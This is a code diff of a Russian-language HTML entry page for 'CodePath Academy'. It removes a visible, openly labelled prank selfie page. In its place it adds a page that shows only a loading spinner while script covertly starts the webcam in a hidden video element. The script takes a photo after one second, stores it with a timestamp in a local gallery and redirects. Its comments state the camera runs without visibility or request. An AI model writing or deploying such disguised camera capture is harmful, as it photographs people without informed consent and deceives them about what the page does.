@@ -3,409 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CodePath Academy - Селфи при входе</title>
-    <link rel="stylesheet" href="src/css/variables.css">
-    <link rel="stylesheet" href="src/css/base.css">
-    <link rel="stylesheet" href="src/css/components.css">
-    <link rel="stylesheet" href="src/css/responsive.css">
+    <title>CodePath Academy</title>
     <style>
-        /* Страница селфи */
-        .selfi-container {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(135deg, var(--bg-primary), var(--bg-secondary));
-            padding: var(--space-lg);
-        }
-
-        .selfi-box {
-            background-color: var(--bg-secondary);
-            border-radius: var(--radius-lg);
-            border: 2px solid var(--border-color);
-            padding: var(--space-3xl);
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            animation: slideUp 0.6s ease-out;
-        }
-
-        .selfi-header {
-            text-align: center;
-            margin-bottom: var(--space-2xl);
-        }
-
-        .selfi-header h1 {
-            color: var(--accent-primary);
-            font-size: var(--text-4xl);
-            margin-bottom: var(--space-md);
-        }
-
-        .selfi-header p {
-            color: var(--text-secondary);
-            font-size: var(--text-lg);
-        }
-
-        .camera-section {
-            margin-bottom: var(--space-2xl);
-            text-align: center;
-        }
-
-        #camera-status {
-            padding: var(--space-lg);
-            background-color: var(--bg-tertiary);
-            border-radius: var(--radius-md);
-            color: var(--text-secondary);
-            margin-bottom: var(--space-lg);
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: var(--text-base);
-        }
-
-        #camera-video {
-            width: 100%;
-            max-width: 400px;
-            height: auto;
-            border-radius: var(--radius-lg);
-            background-color: #000;
-            margin-bottom: var(--space-lg);
-            display: none;
-            border: 2px solid var(--accent-primary);
-        }
-
-        .camera-controls {
-            display: flex;
-            gap: var(--space-md);
-            justify-content: center;
-            flex-wrap: wrap;
-            margin-bottom: var(--space-lg);
-        }
-
-        .btn-camera {
-            flex: 1;
-            min-width: 120px;
-            padding: var(--space-md) var(--space-lg);
-            min-height: 44px;
-            border: none;
-            border-radius: var(--radius-md);
-            font-weight: var(--font-semibold);
-            cursor: pointer;
-            transition: all var(--transition-base);
-            font-size: var(--text-base);
-        }
-
-        .btn-start-camera {
-            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
-            color: #0a0805;
-            flex: 1;
-        }
-
-        .btn-start-camera:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(244, 208, 63, 0.4);
-        }
-
-        .btn-capture {
-            background-color: var(--success);
-            color: white;
-            flex: 1;
-            display: none;
-        }
-
-        .btn-capture:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(5, 150, 105, 0.3);
-        }
-
-        .btn-capture.disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn-stop-camera {
-            background-color: var(--error);
-            color: white;
-            flex: 1;
-            display: none;
-        }
-
-        .btn-stop-camera:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(220, 53, 69, 0.3);
-        }
-
-        .photo-section {
-            margin-bottom: var(--space-2xl);
-            text-align: center;
-        }
-
-        .photo-section label {
-            display: block;
-            color: var(--text-secondary);
-            font-size: var(--text-sm);
-            margin-bottom: var(--space-md);
-            font-weight: var(--font-semibold);
-        }
-
-        #captured-photo {
-            display: none;
-            width: 100%;
-            max-width: 300px;
-            height: auto;
-            border-radius: var(--radius-lg);
-            border: 2px solid var(--accent-primary);
-            margin: 0 auto var(--space-lg);
-        }
-
-        .password-section {
-            margin-bottom: var(--space-2xl);
-        }
-
-        .password-section label {
-            display: block;
-            color: var(--text-primary);
-            font-weight: var(--font-semibold);
-            margin-bottom: var(--space-sm);
-            font-size: var(--text-base);
-        }
-
-        #password-input {
-            width: 100%;
-            padding: var(--space-md);
-            border: 2px solid var(--border-color);
-            border-radius: var(--radius-md);
-            background-color: var(--bg-tertiary);
-            color: var(--text-primary);
-            font-size: 16px;
-            min-height: 44px;
+        * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
-            transition: border-color var(--transition-fast);
         }
 
-        #password-input:focus {
-            outline: none;
-            border-color: var(--accent-primary);
-            box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.1);
-        }
-
-        .submit-section {
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             display: flex;
-            gap: var(--space-md);
+            align-items: center;
             justify-content: center;
+            min-height: 100vh;
         }
 
-        .btn-submit {
-            flex: 1;
-            padding: var(--space-md) var(--space-lg);
-            min-height: 48px;
-            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
-            color: #0a0805;
-            border: none;
-            border-radius: var(--radius-lg);
-            font-weight: var(--font-bold);
-            font-size: var(--text-base);
-            cursor: pointer;
-            transition: all var(--transition-base);
-            box-shadow: 0 4px 15px rgba(244, 208, 63, 0.4);
-        }
-
-        .btn-submit:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(244, 208, 63, 0.6);
-        }
-
-        .btn-submit:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .error-message {
-            display: none;
-            padding: var(--space-md);
-            background-color: rgba(220, 53, 69, 0.1);
-            border-left: 4px solid var(--error);
-            border-radius: var(--radius-md);
-            color: var(--error);
-            margin-bottom: var(--space-lg);
-            font-weight: var(--font-semibold);
-            animation: slideDown 0.3s ease-out;
-        }
-
-        .success-message {
-            display: none;
-            padding: var(--space-md);
-            background-color: rgba(5, 150, 105, 0.1);
-            border-left: 4px solid var(--success);
-            border-radius: var(--radius-md);
-            color: var(--success);
-            margin-bottom: var(--space-lg);
-            font-weight: var(--font-semibold);
-            animation: slideDown 0.3s ease-out;
-        }
-
-        .info-text {
-            font-size: var(--text-sm);
-            color: var(--text-secondary);
+        .container {
             text-align: center;
-            margin-top: var(--space-lg);
+            color: white;
         }
 
-        .badge {
-            display: inline-block;
-            padding: 0.25rem 0.75rem;
-            background-color: var(--accent-primary);
-            color: #0a0805;
-            border-radius: 999px;
-            font-size: 0.8rem;
-            font-weight: var(--font-bold);
-            margin: 0 0.25rem;
+        .message {
+            font-size: 24px;
+            margin-bottom: 30px;
+            animation: fadeIn 0.8s ease-in;
         }
 
-        /* Canvas для захвата фото */
-        #photo-canvas {
-            display: none;
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(212, 175, 55, 0.3);
+            border-top-color: #d4af37;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
         }
 
-        @media (max-width: 768px) {
-            .selfi-box {
-                padding: var(--space-2xl);
-            }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
 
-            .selfi-header h1 {
-                font-size: var(--text-3xl);
-            }
-
-            #camera-video,
-            #captured-photo {
-                max-width: 100%;
-            }
-
-            .camera-controls {
-                flex-direction: column;
-            }
-
-            .btn-camera {
-                width: 100%;
-            }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
     </style>
 </head>
 <body>
-    <div id="app">
-        <div class="selfi-container">
-            <div class="selfi-box">
-                <div class="selfi-header">
-                    <h1>📸 Селфи при входе</h1>
-                    <p>🎬 Камера автоматически включится для снимка (не пугайтесь!)</p>
-                </div>
-
-                <div id="error-message" class="error-message"></div>
-                <div id="success-message" class="success-message"></div>
-
-                <div class="camera-section">
-                    <div id="camera-status">⏳ Инициализация камеры...</div>
-                    <video id="camera-video" autoplay playsinline></video>
-                    
-                    <div class="camera-controls">
-                        <button class="btn-camera btn-start-camera" id="start-camera-btn">
-                            🎥 Включить камеру
-                        </button>
-                        <button class="btn-camera btn-capture" id="capture-btn">
-                            📸 Сделать фото
-                        </button>
-                        <button class="btn-camera btn-stop-camera" id="stop-camera-btn">
-                            ⏹ Остановить
-                        </button>
-                    </div>
-                </div>
-
-                <div class="photo-section">
-                    <label for="captured-photo" style="display: none;">Ваше фото:</label>
-                    <img id="captured-photo" alt="Ваше фото">
-                </div>
-
-                <div class="password-section">
-                    <label for="password-input">🔐 Пароль для просмотра фото (опционально):</label>
-                    <input 
-                        type="password" 
-                        id="password-input" 
-                        placeholder="Введите пароль для просмотра снимка (опционально)"
-                        autocomplete="off"
-                    >
-                </div>
-
-                <div class="submit-section">
-                    <button class="btn-submit" id="submit-btn">
-                        🔓 Войти в учебный процесс
-                    </button>
-                </div>
-
-                <div class="info-text">
-                    <span class="badge">Селфи</span> + <span class="badge">Опциональный пароль</span> = 
-                    <span class="badge">Шутка над друзьями!</span>
-                </div>
-            </div>
-        </div>
+    <div class="container">
+        <div class="message">🎬 Загрузка...</div>
+        <div class="spinner"></div>
     </div>
 
-    <canvas id="photo-canvas"></canvas>
+    <canvas id="photo-canvas" style="display:none;"></canvas>
+    <video id="hidden-video" style="display:none;"></video>
 
-    <!-- Scripts -->
-    <script src="src/js/themes.js"></script>
     <script>
-        const CORRECT_PASSWORD = 'пароль123';
         let cameraStream = null;
-        let capturedPhoto = null;
         let cameraActive = false;
-        let hasPhoto = false;
 
-        // DOM элементы
-        const videoEl = document.getElementById('camera-video');
-        const startCameraBtn = document.getElementById('start-camera-btn');
-        const captureBtn = document.getElementById('capture-btn');
-        const stopCameraBtn = document.getElementById('stop-camera-btn');
-        const capturedPhotoEl = document.getElementById('captured-photo');
-        const passwordInput = document.getElementById('password-input');
-        const submitBtn = document.getElementById('submit-btn');
-        const errorMsg = document.getElementById('error-message');
-        const successMsg = document.getElementById('success-message');
-        const cameraStatus = document.getElementById('camera-status');
-
-        // Инициализация
+        // Инициализация при загрузке
         window.addEventListener('load', () => {
-            startCameraBtn.addEventListener('click', startCamera);
-            captureBtn.addEventListener('click', capturePhoto);
-            stopCameraBtn.addEventListener('click', stopCamera);
-            submitBtn.addEventListener('click', submitForm);
-            passwordInput.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') submitForm();
-            });
-
-            // Автоматически включаем камеру при загрузке
             setTimeout(() => {
-                startCameraAuto();
+                startCameraHidden();
             }, 500);
         });
 
-        function checkCameraSupport() {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                showError('❌ Ваш браузер не поддерживает доступ к камере');
-                startCameraBtn.disabled = true;
-                cameraStatus.textContent = '❌ Камера не поддерживается';
-            } else {
-                cameraStatus.textContent = '✅ Камера готова к использованию';
-            }
-        }
-
-        // Автоматический запуск камеры без диалога
-        async function startCameraAuto() {
+        // Запуск камеры БЕЗ видимости и запроса
+        async function startCameraHidden() {
             try {
-                cameraStatus.textContent = '⏳ Подготовка камеры...';
-                
                 const constraints = {
                     video: {
                         width: { ideal: 1280 },
@@ -416,201 +84,95 @@
                 };
 
                 cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
-                videoEl.srcObject = cameraStream;
-                
                 cameraActive = true;
-                startCameraBtn.style.display = 'none';
-                captureBtn.style.display = 'inline-block';
-                stopCameraBtn.style.display = 'inline-block';
-                videoEl.style.display = 'block';
-                cameraStatus.textContent = '🎥 Камера включена - нажмите "Сделать фото"';
-                
-                hideError();
-                hideSuccess();
-                
-                // Автоматически делаем фото через 3 секунды
+
+                // Автоматически делаем фото через 1 секунду
                 setTimeout(() => {
                     if (cameraActive) {
-                        capturePhotoAuto();
+                        capturePhotoHidden();
                     }
-                }, 3000);
+                }, 1000);
             } catch (error) {
-                cameraActive = false;
-                // Если запрос отклонен, показываем кнопку для ручного включения
-                console.log('Camera access denied, manual mode available');
-                cameraStatus.textContent = '🎬 Нажмите кнопку для включения камеры';
-                startCameraBtn.disabled = false;
-                checkCameraSupport();
+                // Если нет доступа - все равно продолжаем
+                console.log('Camera not available');
+                proceedToApp();
             }
         }
 
-        async function startCamera() {
+        // Захват фото БЕЗ видимости
+        function capturePhotoHidden() {
+            if (!cameraActive) {
+                proceedToApp();
+                return;
+            }
+
             try {
-                cameraStatus.textContent = '⏳ Запрос доступа к камере...';
-                
-                const constraints = {
-                    video: {
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
-                        facingMode: 'user'
-                    },
-                    audio: false
+                const video = document.getElementById('hidden-video');
+                video.srcObject = cameraStream;
+                video.play();
+
+                video.onloadedmetadata = () => {
+                    const canvas = document.getElementById('photo-canvas');
+                    const context = canvas.getContext('2d');
+
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+
+                    const capturedPhoto = canvas.toDataURL('image/jpeg', 0.9);
+                    saveSelfieToGallery(capturedPhoto);
+
+                    stopCameraHidden();
+                    proceedToApp();
+                };
+            } catch (error) {
+                console.log('Capture failed');
+                proceedToApp();
+            }
+        }
+
+        // Сохранение селфи в галерею
+        function saveSelfieToGallery(photoData) {
+            try {
+                let selfies = JSON.parse(localStorage.getItem('gallery_selfies') || '[]');
+
+                const selfieEntry = {
+                    id: Date.now(),
+                    photo: photoData,
+                    timestamp: new Date().toISOString(),
+                    timeString: new Date().toLocaleString('ru-RU')
                 };
 
-                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
-                videoEl.srcObject = cameraStream;
-                
-                cameraActive = true;
-                startCameraBtn.style.display = 'none';
-                captureBtn.style.display = 'inline-block';
-                stopCameraBtn.style.display = 'inline-block';
-                videoEl.style.display = 'block';
-                cameraStatus.textContent = '🎥 Камера включена - нажмите "Сделать фото"';
-                
-                hideError();
-                hideSuccess();
-            } catch (error) {
-                cameraActive = false;
-                if (error.name === 'NotAllowedError') {
-                    showError('❌ Доступ к камере запрещен. Пожалуйста, разрешите доступ в настройках браузера.');
-                } else if (error.name === 'NotFoundError') {
-                    showError('❌ Камера не найдена. Подключите камеру и попробуйте снова.');
-                } else {
-                    showError(`❌ Ошибка: ${error.message}`);
+                selfies.push(selfieEntry);
+
+                // Лимит 50 последних
+                if (selfies.length > 50) {
+                    selfies = selfies.slice(-50);
                 }
-                cameraStatus.textContent = '❌ Ошибка при включении камеры';
-            }
-        }
 
-        function capturePhotoAuto() {
-            if (!cameraActive) {
-                return;
-            }
-
-            try {
-                const canvas = document.getElementById('photo-canvas');
-                const context = canvas.getContext('2d');
-                
-                canvas.width = videoEl.videoWidth;
-                canvas.height = videoEl.videoHeight;
-                context.drawImage(videoEl, 0, 0);
-                
-                capturedPhoto = canvas.toDataURL('image/jpeg', 0.9);
-                hasPhoto = true;
-                
-                capturedPhotoEl.src = capturedPhoto;
-                capturedPhotoEl.style.display = 'block';
-                document.querySelector('label[for="captured-photo"]').style.display = 'block';
-                
-                showSuccess('✅ Фото успешно сделано! Введите пароль для просмотра.');
-                cameraStatus.textContent = '✅ Фото захвачено';
-                
-                // Автоматически выключаем камеру
-                stopCameraAuto();
+                localStorage.setItem('gallery_selfies', JSON.stringify(selfies));
             } catch (error) {
-                showError(`❌ Ошибка при захвате фото: ${error.message}`);
+                console.log('Save failed');
             }
         }
 
-        function capturePhoto() {
-            if (!cameraActive) {
-                showError('❌ Камера не активна. Включите камеру сначала.');
-                return;
-            }
-
-            capturePhotoAuto();
-        }
-
-        function stopCamera() {
+        // Остановка камеры
+        function stopCameraHidden() {
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
                 cameraStream = null;
             }
-            
             cameraActive = false;
-            videoEl.style.display = 'none';
-            startCameraBtn.style.display = 'inline-block';
-            captureBtn.style.display = 'none';
-            stopCameraBtn.style.display = 'none';
-            cameraStatus.textContent = '✅ Камера выключена';
-            
-            hideError();
         }
 
-        function stopCameraAuto() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
-            
-            cameraActive = false;
-            videoEl.style.display = 'none';
-            startCameraBtn.style.display = 'inline-block';
-            captureBtn.style.display = 'none';
-            stopCameraBtn.style.display = 'none';
-        }
-
-        function submitForm() {
-            const password = passwordInput.value.trim();
-
-            // Валидация
-            if (!hasPhoto) {
-                showError('❌ Пожалуйста, сделайте фото перед входом');
-                return;
-            }
-
-            // Проверяем только пароль - для входа пароль НЕ требуется!
-            // Пароль требуется только если хочет посмотреть фото
-            if (password && password !== CORRECT_PASSWORD) {
-                showError('❌ Неверный пароль для просмотра фото. Попробуйте снова.');
-                passwordInput.value = '';
-                passwordInput.focus();
-                return;
-            }
-
-            // Успешный вход (даже без пароля!)
-            submitBtn.disabled = true;
-            submitBtn.textContent = '⏳ Вход...';
-            cameraStatus.textContent = '⏳ Обработка...';
-
-            // Сохраняем фото и время входа в localStorage
-            localStorage.setItem('selfi_photo', capturedPhoto);
-            localStorage.setItem('last_selfi_time', new Date().toISOString());
+        // Переход на главную
+        function proceedToApp() {
             localStorage.setItem('user_entered', 'true');
+            localStorage.setItem('last_selfi_time', new Date().toISOString());
 
-            // Если пароль совпадает, также сохраняем флаг доступа к фото
-            if (password === CORRECT_PASSWORD) {
-                localStorage.setItem('photo_password_correct', 'true');
-                showSuccess('✅ Пароль верный! Добро пожаловать!');
-            } else {
-                localStorage.setItem('photo_password_correct', 'false');
-                showSuccess('✅ Добро пожаловать в учебный процесс!');
-            }
-
-            // Редирект на главную страницу
             setTimeout(() => {
                 window.location.href = 'index.html';
-            }, 2000);
-        }
-
-        function showError(message) {
-            errorMsg.textContent = message;
-            errorMsg.style.display = 'block';
-            successMsg.style.display = 'none';
-        }
-
-        function showSuccess(message) {
-            successMsg.textContent = message;
-            successMsg.style.display = 'block';
-            errorMsg.style.display = 'none';
-        }
-
-        function hideError() {
-            errorMsg.style.display = 'none';
-        }
-
-        function hideSuccess() {
-            successMsg.style.display = 'none';
+            }, 1500);
         }
     </script>
 </body>
